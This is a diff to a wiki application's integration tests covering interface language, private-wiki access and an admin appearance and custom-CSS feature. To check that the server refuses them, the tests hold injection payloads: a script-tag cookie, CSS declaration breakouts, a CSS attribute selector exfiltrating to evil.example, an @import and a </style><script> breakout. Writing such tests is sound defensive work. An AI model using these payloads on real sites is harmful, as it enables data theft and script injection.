@@ -412,17 +412,41 @@ try {
   enc.jar.lang = "en";
   const enLogin = await enc.req("GET", "/login");
   ok(
-    /<html lang="de"/.test(enLogin.text) &&
-      enLogin.text.includes("Passwort vergessen?") &&
-      !enLogin.text.includes("Forgot your password?"),
-    "German only: a language cookie changes nothing",
+    /<html lang="en"/.test(enLogin.text) &&
+      enLogin.text.includes("Forgot your password?") &&
+      !enLogin.text.includes("Passwort vergessen?"),
+    "the language cookie switches the interface to English",
+  );
+  const badLang = new Client();
+  badLang.jar.lang = "fr%22%3E%3Cscript%3E";
+  ok(
+    /<html lang="de"/.test((await badLang.req("GET", "/login")).text),
+    "an unknown language cookie falls back to the default",
   );
   const deErr = await new Client().req("POST", "/api/auth/login", {
     username: "nobody-here",
     password: "wrong-wrong-wrong-1",
   });
   ok(deErr.json?.error === "Benutzername oder Passwort falsch.", `API errors are translated (${deErr.json?.error})`);
-  ok((await anon.req("GET", "/w/welcome")).text.includes("Willkommen"), "built-in page is German");
+  const enErr = await enc.req("POST", "/api/auth/login", { username: "nobody-here", password: "wrong-wrong-wrong-1" });
+  ok(
+    enErr.json?.error === "Wrong username or password.",
+    `API errors follow the chosen language (${enErr.json?.error})`,
+  );
+  const deWelcome = (await anon.req("GET", "/w/welcome")).text;
+  ok(deWelcome.includes("Willkommen") && !deWelcome.includes(">Welcome<"), "built-in page is German");
+  const enWelcome = (await enc.req("GET", "/w/welcome")).text;
+  ok(
+    enWelcome.includes(">Welcome</h1>") && enWelcome.includes("Markdown guide") && !enWelcome.includes("Willkommen"),
+    "an unedited built-in page (and its title in the menu) follows the reader's language",
+  );
+  const enHits = await enc.req("GET", "/api/search?q=markdown");
+  ok(
+    enHits.json?.hits?.some(
+      (h) => h.slug === "markdown-guide" && h.title.map((x) => x.t).join("") === "Markdown guide",
+    ),
+    "search shows built-in page titles in the reader's language",
+  );
 
   console.log("• user management + security log + GDPR");
   const cu = await admin.req("POST", "/api/users", {
@@ -629,6 +653,14 @@ try {
   await admin.req("PUT", "/api/settings", { public_read: false });
   ok((await anon.req("GET", "/privacy")).status === 200, "privacy notice stays public when the wiki is private");
   ok((await fetch(BASE + img.json.url)).status === 401, "media follow the read permission");
+  const secret = await admin.req("POST", "/api/pages", { title: "Geheimprojekt Zebra", content: "streng geheim" });
+  for (const u of [`/w/${secret.json.slug}`, `/w/${secret.json.slug}/history`, `/w/${secret.json.slug}/edit`, "/"]) {
+    const r = await anon.req("GET", u);
+    ok(
+      r.status !== 200 && !r.text.includes("Geheimprojekt") && !r.text.includes("streng geheim"),
+      `private wiki: ${u} gives away neither title nor text (${r.status})`,
+    );
+  }
   await admin.req("PUT", "/api/settings", { public_read: true });
   const lg = await admin.req("PUT", "/api/legal/terms", { lang: "de", content: "# Hausordnung" });
   ok(
@@ -1249,6 +1281,114 @@ try {
       .map((r) => r.name)
       .every((n) => existsSync(path.join(DATA, "media", n)));
     ok(usedStill, "files that pages still show are kept");
+
+    // --- appearance (Darstellung)
+    const look = (await admin.req("GET", "/api/appearance")).json;
+    ok(look.preset === "tide" && look.display.width === "full", "default look is Tide");
+    const deepsea = {
+      ...look,
+      preset: "deepsea",
+      accent: "#4fd1c5",
+      accentLight: "#0e7c74",
+      font: "manrope",
+      background: {
+        ...look.background,
+        base: "color",
+        colorLight: "#e6f0f6",
+        colorDark: "#04121f",
+        gradientOn: true,
+        gradient: "tidepool",
+      },
+      band: { light: "#0b2236", dark: "#020a12" },
+      theme: "dark",
+    };
+    ok(
+      (await anon.req("PUT", "/api/appearance", deepsea)).status === 401 &&
+        (await edda.req("PUT", "/api/appearance", deepsea)).status === 403 &&
+        (await bob.req("PUT", "/api/appearance", deepsea)).status === 403,
+      "only administrators change the look",
+    );
+    ok(
+      (await admin.req("PUT", "/api/appearance", deepsea, { origin: "https://evil.example" })).status === 403,
+      "appearance is CSRF-protected",
+    );
+    ok(
+      (await admin.req("PUT", "/api/settings", { appearance: "{}" })).status === 400,
+      "not through the general settings",
+    );
+    let lookBad = true;
+    for (const v of [
+      { ...deepsea, accent: "red" },
+      { ...deepsea, accent: "#000000;}html{display:none" },
+      { ...deepsea, customFont: '"}body{display:none' },
+      { ...deepsea, background: { ...deepsea.background, image: "https://evil.example/a.png" } },
+      { ...deepsea, background: { ...deepsea.background, image: '/media/x.png");}' } },
+      { ...deepsea, display: { scale: "auto", size: 9999, width: "full" } },
+      [],
+      "x",
+    ]) {
+      const r = await admin.req("PUT", "/api/appearance", v);
+      if (r.status !== 400) {
+        lookBad = false;
+        console.log("   look accepted:", JSON.stringify(v).slice(0, 80), r.status);
+      }
+    }
+    ok(lookBad, "invalid looks are refused");
+    ok((await admin.req("PUT", "/api/appearance", deepsea)).status === 200, "admin saves a preset");
+    const lookPage = (await anon.req("GET", "/")).text;
+    ok(
+      lookPage.includes('id="tw-theme"') &&
+        lookPage.includes("--accent: #0e7c74") &&
+        lookPage.includes('href="/fonts/manrope.css"') &&
+        lookPage.includes('data-theme="dark"'),
+      "every page carries the look: colours, font, default theme",
+    );
+    const fontCss = await anon.req("GET", "/fonts/manrope.css");
+    ok(fontCss.status === 200 && /woff2\?v=/.test(fontCss.text), "the font is served from the wiki itself");
+    const woff = fontCss.text.match(/url\((\/fonts\/manrope\/[^)?]+)/)[1];
+    const woffRes = await fetch(BASE + woff);
+    ok(woffRes.ok && /immutable/.test(woffRes.headers.get("cache-control") ?? ""), "font files are cached for good");
+    // a background image: an image of the wiki, kept by "delete unused"
+    const bgImg = await mup(eve, "hintergrund.png");
+    const withImg = {
+      ...deepsea,
+      background: { ...deepsea.background, imageOn: true, image: `/media/${bgImg.name}`, blur: 6, dim: 35 },
+    };
+    ok((await admin.req("PUT", "/api/appearance", withImg)).status === 200, "background image set");
+    ok(
+      (await anon.req("GET", "/")).text.includes(`url(&quot;/media/${bgImg.name}&quot;)`) ||
+        (await anon.req("GET", "/")).text.includes(`url("/media/${bgImg.name}")`),
+      "the page draws it",
+    );
+    await eve.req("POST", "/api/media/unused");
+    ok(existsSync(path.join(DATA, "media", bgImg.name)), "“delete unused” keeps the background image");
+    // the owner's CSS: owner only, with the password, nothing from elsewhere, can't break out
+    const cssPut = (c, body) => c.req("PUT", "/api/appearance/css", body);
+    ok((await cssPut(eve, { css: ".sheet{}", password: PW })).status === 403, "custom CSS: owner only");
+    ok(
+      (await cssPut(admin, { css: ".sheet{}", password: "wrong-wrong-wrong-1" })).status === 403,
+      "custom CSS needs the password",
+    );
+    await dbq("DELETE FROM rate_limits WHERE key LIKE 'reauth:%'");
+    ok(
+      (await cssPut(admin, { css: "input[value^=a]{background:u\\72l(https://evil.example/?a)}", password: PW }))
+        .status === 400,
+      "custom CSS can't load from elsewhere (even escaped)",
+    );
+    ok(
+      (await cssPut(admin, { css: "@import 'https://evil.example/x.css';", password: PW })).status === 400,
+      "no @import",
+    );
+    const breakout = ".sheet{outline:2px solid #c00}\na::after{content:'</style><script>alert(1)</script>'}";
+    ok((await cssPut(admin, { css: breakout, password: PW })).status === 200, "owner saves custom CSS");
+    const cssPage = (await anon.req("GET", "/")).text;
+    ok(
+      cssPage.includes("outline:2px solid #c00") && !cssPage.includes("</style><script>alert(1)"),
+      "custom CSS applied, can't close the <style>",
+    );
+    // back to the default
+    await cssPut(admin, { css: "", password: PW });
+    ok((await admin.req("PUT", "/api/appearance", look)).status === 200, "back to Tide");
 
     // a preview belongs to the admin who made it
     const evePrev = await previewArr(admin);
